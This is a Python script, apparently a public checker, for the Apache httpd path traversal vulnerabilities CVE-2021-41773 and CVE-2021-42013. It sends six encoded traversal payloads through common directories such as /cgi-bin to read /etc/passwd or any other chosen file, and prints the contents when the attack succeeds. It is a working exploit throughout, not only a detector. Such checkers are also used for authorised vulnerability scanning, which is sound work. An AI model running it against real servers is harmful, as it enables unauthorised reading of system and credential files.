# apache httpd path traversal cve-2021-41773 and cve-2021-42013 checker
# twitter : https://twitter.com/Shadow_warrior0


import argparse
from urllib import request

parser = argparse.ArgumentParser(description="A tool for check apache vuln")
parser.add_argument("-f", "--filename",type=str, default='/etc/passwd', help="file name" )
parser.add_argument("-u", "--url", type=str , help="url ")
args = parser.parse_args()

host =str(args.url)
filename=args.filename
isVulnerable=False
payload1="/.%2e/%2e%2e/%2e%2e/%2e%2e"
payload2="/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e"
payload3="/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"
payload4="/.%%32%65/.%%32%65/.%%32%65/.%%32%65"
payload5="/.%%32e/.%%32e/.%%32e/.%%32e"
payload6="/.%2%65/.%2%65/.%2%65/.%2%65"


payloads= [payload1,payload2,payload3,payload4,payload4,payload5,payload6]
dirlist =['/cgi-bin', '/icons', '/assets', '/uploads',  '/image']

proof = "root:"

for payload in payloads:
    for cdir in dirlist:
        fullUrl = host + cdir + payload + filename
        # print(fullUrl)
        try:
            response = request.Request(fullUrl)
            response = request.urlopen(response)
            responseContent = str(response.read())
            
   

            if(proof in responseContent):
                print("[use payload" + str(payloads.index(payload)) +"] " +  host + cdir   + " is vulnerable!!!")
                isVulnerable = True
                print(responseContent)
                break

        except Exception as e:
            print("[use payload" + str(payloads.index(payload)) +"] " + host + cdir  )
            print(e)
        if isVulnerable:
            break

if(isVulnerable == False):
        print("[use all payload] " + "<" + host + ">" + " not seems vulnerable")
